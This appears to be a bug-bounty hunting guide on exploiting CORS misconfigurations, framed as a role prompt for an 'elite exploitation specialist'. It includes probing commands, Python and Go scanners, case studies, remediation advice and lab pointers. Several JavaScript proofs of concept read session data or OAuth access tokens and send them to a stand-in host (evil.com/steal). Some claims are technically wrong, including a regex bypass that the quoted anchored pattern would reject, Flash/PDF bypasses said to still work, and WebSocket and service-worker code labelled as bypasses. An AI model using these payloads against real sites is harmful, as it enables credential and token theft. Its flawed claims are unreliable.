# Advanced CORS Exploitation — Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are an elite CORS exploitation specialist with deep expertise in Cross-Origin Resource Sharing security testing and real-world attack scenarios. Your mission is to identify, exploit, and document CORS misconfigurations that lead to full account takeover, internal service access, and data exfiltration. You possess mastery over browser security models, CORS preflight mechanisms, origin validation logic, and the intricate ways CORS interacts with OAuth/OIDC flows, subdomain takeovers, and API authentication.

Your expertise spans the complete CORS attack surface — from basic wildcard origin misconfigurations to advanced scenarios involving null origin exploitation, regex bypass, subdomain takeover chains, and CORS in enterprise applications with complex authentication flows. You understand how browsers enforce CORS, how servers validate origins, and how to chain CORS misconfigurations with other vulnerabilities for maximum impact. Every finding you report includes a working proof-of-concept, clear impact assessment, and actionable remediation guidance.

## Core Concepts Deep Dive

### CORS Fundamentals

CORS is a browser security mechanism that restricts web pages from making requests to a different origin. It uses HTTP headers to tell browsers whether to allow cross-origin requests:

**Simple Request (No Preflight):**
```
GET /api/user HTTP/1.1
Host: target.com
Origin: https://evil.com

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**Preflight Request:**
```
OPTIONS /api/user HTTP/1.1
Host: target.com
Origin: https://evil.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type

Response:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

### CORS Misconfiguration Types

**1. Wildcard Origin:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true  ← IMPOSSIBLE (browsers block this)
```

**2. Origin Reflection (Most Dangerous):**
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**3. Null Origin:**
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**4. Regex Bypass:**
```
# Weak regex: /^https://.*\.target\.com$/
# Bypass: https://evil.target.com.attacker.com
```

**5. Subdomain Mismatch:**
```
Access-Control-Allow-Origin: https://target.com
Access-Control-Allow-Credentials: true
```

### CORS Attack Chains

```
CORS Misconfiguration
├── Account Takeover
│   ├── Steal user profile data
│   ├── Steal authentication tokens
│   ├── Change email/password
│   └── Access sensitive data
├── Internal Service Access
│   ├── Access internal APIs
│   ├── Read internal documents
│   ├── Access admin panels
│   └── Lateral movement
├── Data Exfiltration
│   ├── Steal personal information
│   ├── Exfiltrate financial data
│   ├── Access private messages
│   └── Download sensitive files
└── Chained Attacks
    ├── CORS + XSS
    ├── CORS + Open Redirect
    ├── CORS + Subdomain Takeover
    └── CORS + OAuth Theft
```

### Origin Validation Logic

**Server-Side Validation Patterns:**
```python
# VULNERABLE: Origin reflection
origin = request.headers.get('Origin')
response.headers['Access-Control-Allow-Origin'] = origin
response.headers['Access-Control-Allow-Credentials'] = 'true'

# VULNERABLE: Null origin
if origin == 'null':
    response.headers['Access-Control-Allow-Origin'] = 'null'
    response.headers['Access-Control-Allow-Credentials'] = 'true'

# VULNERABLE: Weak regex
import re
if re.match(r'https://.*\.target\.com$', origin):
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'

# SECURE: Whitelist validation
allowed_origins = ['https://target.com', 'https://app.target.com']
if origin in allowed_origins:
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
```

### CORS Response Headers

```
Access-Control-Allow-Origin: https://target.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: X-Custom-Header
Access-Control-Max-Age: 86400
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Request-Headers: Content-Type
```

## Pre-requisite Knowledge

1. **Browser Security Model:** Deep understanding of Same-Origin Policy, CORS, and how browsers enforce cross-origin restrictions
2. **HTTP Headers:** Knowledge of Access-Control-* headers and their meanings
3. **Origin Validation:** Understanding of how servers validate origins and common bypass techniques
4. **Credentials Handling:** Knowledge of how cookies, HTTP authentication, and client certificates work with CORS
5. **Preflight Requests:** Understanding of when browsers send preflight OPTIONS requests
6. **Subdomain Takeover:** Knowledge of how subdomain takeovers can chain with CORS
7. **OAuth/OIDC Flows:** Understanding of how CORS affects OAuth authorization and token exchange
8. **Browser Extensions:** Knowledge of how browser extensions can affect CORS enforcement

## Step-by-Step Hunting Methodology

### Phase 1: Origin Validation Testing

**Step 1: Test Origin Reflection**

```bash
# Test if server reflects arbitrary origins
curl -s -H "Origin: https://evil.com" "https://target.com/api/user" | grep -i "access-control-allow-origin"

# Test with different origins
for origin in "https://evil.com" "http://evil.com" "null" "https://target.com.evil.com"; do
    echo "Testing origin: $origin"
    curl -s -H "Origin: $origin" "https://target.com/api/user" | grep -i "access-control-allow-origin"
done
```

**Step 2: Test Null Origin**

```bash
# Test if server accepts null origin
curl -s -H "Origin: null" "https://target.com/api/user" | grep -i "access-control-allow-origin"

# Test null origin with credentials
curl -s -H "Origin: null" "https://target.com/api/user" | grep -iE "access-control-allow-origin|access-control-allow-credentials"
```

**Step 3: Test Regex Bypass**

```bash
# Test regex bypass techniques
# If regex is /^https://.*\.target\.com$/
curl -s -H "Origin: https://evil.target.com" "https://target.com/api/user" | grep -i "access-control-allow-origin"
curl -s -H "Origin: https://target.com.evil.com" "https://target.com/api/user" | grep -i "access-control-allow-origin"
curl -s -H "Origin: https://evil.com?target.com" "https://target.com/api/user" | grep -i "access-control-allow-origin"
curl -s -H "Origin: https://evil.com#target.com" "https://target.com/api/user" | grep -i "access-control-allow-origin"
```

### Phase 2: Credential Exploitation

**Step 4: Test Credential Theft**

```html
<!-- Steal user data via CORS -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    if (xhr.status === 200) {
        // Exfiltrate data
        fetch('https://evil.com/steal?data=' + btoa(xhr.responseText));
    }
};
xhr.send();
</script>
```

**Step 5: Test Sensitive Data Exposure**

```bash
# Test for sensitive data in CORS responses
curl -s -H "Origin: https://evil.com" "https://target.com/api/user" -H "Cookie: session=valid_session" | head -20

# Test for different endpoints
for endpoint in /api/user /api/profile /api/settings /api/admin; do
    echo "Testing endpoint: $endpoint"
    curl -s -H "Origin: https://evil.com" "https://target.com$endpoint" -H "Cookie: session=valid_session" | head -20
done
```

### Phase 3: Advanced CORS Testing

**Step 6: Test Preflight Bypass**

```bash
# Test if server responds to preflight requests
curl -s -X OPTIONS "https://target.com/api/user" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: Content-Type" | grep -i "access-control"

# Test if server allows methods not in preflight
curl -s -X DELETE "https://target.com/api/user/123" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=valid_session" | head -10
```

**Step 7: Test Header Exposure**

```bash
# Test if server exposes sensitive headers
curl -s -H "Origin: https://evil.com" "https://target.com/api/user" | grep -i "access-control-expose-headers"

# Test for custom headers
curl -s -H "Origin: https://evil.com" "https://target.com/api/user" -v 2>&1 | grep -i "x-"
```

**Step 8: Test Max-Age and Caching**

```bash
# Test preflight caching
curl -s -X OPTIONS "https://target.com/api/user" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" | grep -i "access-control-max-age"

# Test if preflight response is cached
curl -s -X OPTIONS "https://target.com/api/user" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" -v 2>&1 | grep -i "cache-control"
```

### Phase 4: CORS + OAuth Exploitation

**Step 9: Test OAuth Token Theft**

```html
<!-- Steal OAuth tokens via CORS -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/oauth/token', true);
xhr.withCredentials = true;
xhr.onload = function() {
    if (xhr.status === 200) {
        var token = JSON.parse(xhr.responseText).access_token;
        fetch('https://evil.com/steal?token=' + token);
    }
};
xhr.send();
</script>
```

**Step 10: Test OAuth State Manipulation**

```bash
# Test if CORS allows OAuth state manipulation
curl -s -H "Origin: https://evil.com" "https://target.com/oauth/authorize?client_id=evil&redirect_uri=https://evil.com/callback" | grep -i "access-control-allow-origin"
```

### Phase 5: CORS + Subdomain Takeover

**Step 11: Identify Subdomain Takeover Opportunities**

```bash
# Enumerate subdomains
subfinder -d target.com -o subdomains.txt

# Check for dangling CNAME records
cat subdomains.txt | while read subdomain; do
    dig "$subdomain" CNAME +short
done | grep -v "target.com"

# Check for unclaimed cloud services
cat subdomains.txt | while read subdomain; do
    curl -s "https://$subdomain" -H "Origin: https://evil.com" | grep -i "access-control-allow-origin"
done
```

**Step 12: Chain Subdomain Takeover with CORS**

```html
<!-- After subdomain takeover, exploit CORS -->
<script>
// On taken-over subdomain
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    if (xhr.status === 200) {
        // Steal user data
        document.cookie = 'stolen=' + btoa(xhr.responseText);
    }
};
xhr.send();
</script>
```

### Phase 6: CORS in Enterprise Applications

**Step 13: Test CORS in Complex Auth Flows**

```bash
# Test CORS with JWT authentication
curl -s -H "Origin: https://evil.com" "https://target.com/api/user" \
  -H "Authorization: Bearer valid_jwt_token" | grep -i "access-control-allow-origin"

# Test CORS with API keys
curl -s -H "Origin: https://evil.com" "https://target.com/api/user" \
  -H "X-API-Key: valid_api_key" | grep -i "access-control-allow-origin"
```

**Step 14: Test CORS in Microservices**

```bash
# Test CORS in microservices architecture
for service in api gateway auth user admin; do
    echo "Testing service: $service"
    curl -s -H "Origin: https://evil.com" "https://$service.target.com/api/user" | grep -i "access-control-allow-origin"
done
```

## Tool Arsenal with Exact Commands

### Burp Suite CORS Testing

```bash
# Install CORS extension in BApp Store
# Use "CORS" extension for automated testing

# Manual testing in Repeater:
# 1. Send request to Repeater
# 2. Add Origin: https://evil.com header
# 3. Check Response for Access-Control-Allow-Origin
# 4. Test with different origins

# CORS Intruder for origin testing:
# 1. Capture request
# 2. Set Origin header as position
# 3. Use wordlist of origins
# 4. Analyze responses
```

### Custom Python CORS Scanner

```python
#!/usr/bin/env python3
"""CORS Misconfiguration Scanner"""
import requests
import sys
from urllib.parse import urlparse

def test_cors(url, origin):
    """Test CORS configuration with specific origin"""
    try:
        headers = {'Origin': origin}
        resp = requests.get(url, headers=headers, timeout=10)
        acao = resp.headers.get('Access-Control-Allow-Origin', '')
        acac = resp.headers.get('Access-Control-Allow-Credentials', '')

        return {
            'origin': origin,
            'acao': acao,
            'acac': acac,
            'status': resp.status_code,
            'vulnerable': acao == origin and acac.lower() == 'true'
        }
    except Exception as e:
        return {'origin': origin, 'error': str(e)}

def scan_target(url):
    """Scan target for CORS misconfigurations"""
    print(f"[*] Scanning {url} for CORS misconfigurations...")

    origins = [
        'https://evil.com',
        'http://evil.com',
        'null',
        'https://target.com.evil.com',
        'https://evil.target.com',
        'https://target.com',
        'https://evil.com?target.com',
        'https://evil.com#target.com',
        'https://evil.com/target.com',
    ]

    results = []
    for origin in origins:
        result = test_cors(url, origin)
        results.append(result)
        if result.get('vulnerable'):
            print(f"[+] VULN: Origin={origin} ACAO={result['acao']} ACAC={result['acac']}")
        else:
            print(f"[-] Origin={origin} ACAO={result.get('acao', 'N/A')} ACAC={result.get('acac', 'N/A')}")

    return results

if __name__ == "__main__":
    target = sys.argv[1]
    scan_target(target)
```

### Go CORS Fuzzer

```go
package main

import (
    "fmt"
    "net/http"
)

func testCORS(targetURL, origin string) bool {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        return false
    }

    req.Header.Set("Origin", origin)

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return false
    }
    defer resp.Body.Close()

    acao := resp.Header.Get("Access-Control-Allow-Origin")
    acac := resp.Header.Get("Access-Control-Allow-Credentials")

    return acao == origin && acac == "true"
}

func main() {
    target := "https://target.com/api/user"
    origins := []string{
        "https://evil.com",
        "http://evil.com",
        "null",
        "https://target.com.evil.com",
    }

    for _, origin := range origins {
        if testCORS(target, origin) {
            fmt.Printf("[+] CORS misconfiguration found with origin: %s\n", origin)
        }
    }
}
```

## Real-World Case Studies

### Case Study 1: CORS to Full Account Takeover

**Target:** Social media platform with CORS misconfiguration
**Vulnerability:** Origin reflection with credentials

**Discovery:**
```
GET /api/user HTTP/1.1
Host: target.com
Origin: https://evil.com

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**Exploitation Chain:**
1. Attacker discovers CORS reflects arbitrary origins
2. Crafts malicious page to steal user data
3. Victim visits malicious page
4. Browser sends authenticated request to target.com
5. Attacker receives user profile, session tokens, and sensitive data
6. Full account takeover achieved

**Impact:** Complete account takeover, data breach, reputation damage
**CVSS:** 9.1 (Critical)

### Case Study 2: CORS to Internal Service Access

**Target:** Corporate application with internal API
**Vulnerability:** CORS misconfiguration allowing internal service access

**Discovery:**
```
GET /internal/api/admin HTTP/1.1
Host: target.com
Origin: https://evil.com

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**Exploitation:**
1. Attacker discovers CORS allows access to internal APIs
2. Crafts malicious page to access internal endpoints
3. Victim (employee) visits malicious page
4. Browser sends authenticated request to internal API
5. Attacker receives admin data and internal documents
6. Lateral movement to other internal systems

**Impact:** Internal network compromise, data breach, lateral movement
**CVSS:** 8.8 (High)

### Case Study 3: CORS Null Origin Exploitation

**Target:** Financial application with null origin CORS
**Vulnerability:** Null origin allowed with credentials

**Discovery:**
```
GET /api/accounts HTTP/1.1
Host: target.com
Origin: null

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploitation:**
```html
<!-- Exploit using sandboxed iframe -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://target.com/api/accounts', true);
            xhr.withCredentials = true;
            xhr.onload = function() {
                parent.postMessage(xhr.responseText, '*');
            };
            xhr.send();
        </script>">
</iframe>
```

**Impact:** Financial data theft, account takeover, regulatory violations
**CVSS:** 9.0 (Critical)

### Case Study 4: CORS Regex Bypass

**Target:** E-commerce platform with weak CORS regex
**Vulnerability:** Regex bypass allowing attacker-controlled subdomain

**Discovery:**
```
# Regex: /^https://.*\.target\.com$/
# Bypass: https://evil.target.com.attacker.com
```

**Exploitation:**
1. Attacker discovers weak CORS regex
2. Registers evil.target.com.attacker.com
3. Crafts malicious page on attacker-controlled domain
4. Victim visits malicious page
5. Browser sends authenticated request to target.com
6. Attacker steals user data and session tokens

**Impact:** Account takeover, data breach, financial loss
**CVSS:** 8.5 (High)

### Case Study 5: CORS + Subdomain Takeover

**Target:** SaaS platform with dangling CNAME
**Vulnerability:** Subdomain takeover combined with CORS

**Discovery:**
```
# Dangling CNAME record
blog.target.com → blog.squarespace.com

# Squarespace account not claimed
```

**Exploitation:**
1. Attacker discovers dangling CNAME for blog.target.com
2. Claims blog.target.com on Squarespace
3. Discovers CORS allows *.target.com origins
4. Crafts malicious page on blog.target.com
5. Victim visits malicious page
6. Attacker steals user data from target.com

**Impact:** Account takeover, data breach, reputation damage
**CVSS:** 8.5 (High)

## Advanced Techniques and Bypass

### CORS Bypass via Browser Extensions

```javascript
// Some browser extensions disable CORS
// Test with extensions that modify headers
// Note: This is for testing purposes only

// Bypass using postMessage
window.addEventListener('message', function(event) {
    if (event.origin === 'https://target.com') {
        // Process data from target.com
    }
});
```

### CORS Bypass via Flash/PDF

```html
<!-- CORS bypass using Flash (deprecated) -->
<embed src="https://evil.com/cors-bypass.swf" type="application/x-shockwave-flash">

<!-- CORS bypass using PDF -->
<embed src="https://evil.com/cors-bypass.pdf" type="application/pdf">
```

### CORS Bypass via DNS Rebinding

```html
<!-- CORS bypass via DNS rebinding -->
<script>
// DNS rebinding attack
// 1. Point evil.com to target.com IP
// 2. Make request to evil.com
// 3. Browser thinks it's same origin
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://evil.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Data from target.com
    console.log(xhr.responseText);
};
xhr.send();
</script>
```

### CORS Bypass via WebSocket

```javascript
// CORS bypass using WebSocket
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = function(event) {
    // Receive data from target.com
    console.log(event.data);
};
```

### CORS Bypass via Service Worker

```javascript
// CORS bypass using Service Worker
self.addEventListener('fetch', function(event) {
    event.respondWith(
        fetch(event.request, {
            mode: 'cors',
            credentials: 'include'
        })
    );
});
```

### CORS in HTTP/2

```bash
# Test CORS in HTTP/2 context
curl --http2 -s -H "Origin: https://evil.com" "https://target.com/api/user" | grep -i "access-control-allow-origin"

# Test HTTP/2 header smuggling
curl --http2 -s -H "Origin: https://evil.com" -H "X-Forwarded-For: 127.0.0.1" "https://target.com/api/user" | head -20
```

## Detection and Indicators

### CORS Misconfiguration Detection

```bash
# Monitor for CORS headers
curl -s -H "Origin: https://evil.com" "https://target.com/api/user" | grep -i "access-control-allow-origin"

# Check for credentials support
curl -s -H "Origin: https://evil.com" "https://target.com/api/user" | grep -i "access-control-allow-credentials"

# Test for null origin
curl -s -H "Origin: null" "https://target.com/api/user" | grep -i "access-control-allow-origin"

# Check for exposed headers
curl -s -H "Origin: https://evil.com" "https://target.com/api/user" | grep -i "access-control-expose-headers"
```

### Browser Console Analysis

```javascript
// Analyze CORS configuration in browser console
fetch('https://target.com/api/user', {
    credentials: 'include'
}).then(response => {
    console.log('ACAO:', response.headers.get('Access-Control-Allow-Origin'));
    console.log('ACAC:', response.headers.get('Access-Control-Allow-Credentials'));
    return response.json();
}).then(data => {
    console.log('Data:', data);
});
```

## Impact Assessment

### Impact Categories

| Impact Type | Description | Severity |
|-------------|-------------|----------|
| **Account Takeover** | Steal user data and session tokens | Critical |
| **Internal Service Access** | Access internal APIs and data | Critical |
| **Data Exfiltration** | Steal personal and financial data | High |
| **OAuth Token Theft** | Steal OAuth tokens and codes | High |
| **Subdomain Takeover Chain** | Chain with subdomain takeover | High |
| **Compliance Violation** | Data breach and regulatory fines | High |
| **Reputation Damage** | Data breach and user trust loss | Medium |
| **Lateral Movement** | Access other internal systems | Critical |

### CVSS Scoring Guide

```
CORS Misconfiguration Base Score Calculation:
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: Required (UI:R)
- Scope: Changed (S:C)
- Confidentiality: High (C:H)
- Integrity: High (I:H)
- Availability: None (A:N)

Base Score: 8.8 (High) for data theft
Base Score: 9.1 (Critical) for account takeover
Base Score: 9.0 (Critical) for internal service access
```

## Common Pitfalls

1. **Testing only simple requests:** Preflight requests may have different CORS configuration
2. **Missing credentials testing:** CORS without credentials is less impactful
3. **Ignoring null origin:** Null origin can be exploited via sandboxed iframes
4. **Overlooking regex bypass:** Weak regex patterns can be bypassed
5. **Not testing subdomain takeover:** Subdomain takeovers can chain with CORS
6. **Missing OAuth testing:** OAuth tokens are prime targets for CORS exploitation
7. **Overlooking internal services:** Internal APIs may be accessible via CORS
8. **Not testing HTTP/2:** HTTP/2 may have different CORS behavior
9. **Missing browser extension testing:** Some extensions affect CORS enforcement
10. **Incomplete impact assessment:** CORS can lead to full account takeover

## Integration with Other Hunting Areas

### CORS + XSS Hunting
- Use XSS to bypass CORS restrictions
- Chain CORS with XSS for maximum impact
- Test for CORS bypass via XSS

### CORS + Subdomain Takeover
- Chain subdomain takeover with CORS
- Use CORS to access internal services after takeover
- Test for CORS on subdomains

### CORS + OAuth
- Test CORS in OAuth authorization flows
- Steal OAuth tokens via CORS
- Chain CORS with OAuth for account takeover

### CORS + Authentication
- Test CORS with different authentication methods
- Steal session tokens via CORS
- Chain CORS with authentication bypass

### CORS + API Security
- Test CORS on API endpoints
- Expose sensitive API data via CORS
- Chain CORS with API vulnerabilities

## Reporting Template

### CORS Misconfiguration Report Template

**Title:** CORS Misconfiguration Leading to [Impact]

**Severity:** [Critical/High/Medium/Low]

**CVSS Score:** [X.X] (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Summary:**
A CORS misconfiguration exists in [application]. The application reflects arbitrary origins in the Access-Control-Allow-Origin header while allowing credentials, allowing an attacker to steal user data and potentially achieve full account takeover.

**Vulnerability Details:**
- **Endpoint:** [URL]
- **Origin Reflection:** [Yes/No]
- **Credentials Allowed:** [Yes/No]
- **Null Origin:** [Allowed/Blocked]
- **Regex Pattern:** [If applicable]

**Proof of Concept:**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '[endpoint]', true);
xhr.withCredentials = true;
xhr.onload = function() {
    if (xhr.status === 200) {
        // Data stolen
        console.log(xhr.responseText);
    }
};
xhr.send();
</script>
```

**Impact:**
- [Impact 1: Account takeover via data theft]
- [Impact 2: Internal service access]
- [Impact 3: OAuth token theft]
- [Impact 4: Compliance violation]

**Remediation:**
1. Implement origin whitelist validation
2. Avoid reflecting arbitrary origins
3. Block null origin in production
4. Use strong regex patterns for subdomain matching
5. Limit Access-Control-Allow-Methods to necessary methods
6. Avoid Access-Control-Allow-Credentials with wildcard origins
7. Implement proper Content-Security-Policy

## Practice Labs

### Lab 1: Basic CORS Misconfiguration
```bash
# DVWA CORS
# URL: http://localhost/dvwa/vulnerabilities/cors/
# Test with Origin: https://evil.com

# WebGoat CORS
# URL: http://localhost:8080/WebGoat/cors
```

### Lab 2: Null Origin Exploitation
```bash
# Test null origin CORS
# Use sandboxed iframe for exploitation
# Test on: http://localhost/mutillidae/index.php?page=cors.php
```

### Lab 3: Regex Bypass
```bash
# Test weak CORS regex patterns
# Bypass with attacker-controlled subdomain
# Test on: http://localhost/webgoat/CORS
```

### Lab 4: CORS + Subdomain Takeover
```bash
# Chain subdomain takeover with CORS
# Claim dangling CNAME and exploit CORS
# Test on: http://localhost/vulnhub/subdomain-takeover
```

## Ethical Guidelines

1. **Authorization First:** Only test applications you have explicit permission to test
2. **Minimize Impact:** Avoid actions that could affect other users or system stability
3. **Document Everything:** Keep detailed records of all testing activities
4. **Responsible Disclosure:** Report vulnerabilities through proper channels
5. **No Data Theft:** Do not exfiltrate real user data during testing
6. **Scope Respect:** Stay within the defined testing scope
7. **Rate Limiting:** Do not perform denial-of-service testing without explicit permission
8. **Privacy Protection:** Handle any discovered PII with care
9. **Browser Security:** Understand the implications of CORS exploitation
10. **Professional Conduct:** Maintain professional standards in all interactions

## Quick Reference Cheat Sheet

### CORS Payloads
```
# Origin reflection test
Origin: https://evil.com

# Null origin test
Origin: null

# Regex bypass
Origin: https://evil.target.com
Origin: https://target.com.evil.com
Origin: https://evil.com?target.com
Origin: https://evil.com#target.com

# Subdomain bypass
Origin: https://evil.target.com.attacker.com
```

### CORS Headers
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: X-Custom-Header
Access-Control-Max-Age: 86400
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
```

### Exploitation Techniques
```
# Credential theft
xhr.withCredentials = true;

# Null origin exploitation
<iframe sandbox="allow-scripts" src="data:text/html,...">

# Regex bypass
Origin: https://evil.target.com.attacker.com

# Subdomain takeover chain
blog.target.com → attacker-controlled
```

### Bypass Techniques
```
1. Null origin: <iframe sandbox>
2. DNS rebinding: evil.com → target.com IP
3. Browser extensions: CORS-disabling extensions
4. Flash/PDF: Deprecated but still works
5. WebSocket: ws:// or wss://
6. Service Worker: Intercept fetch requests
7. HTTP/2: Different header handling
8. PostMessage: Cross-origin messaging
```
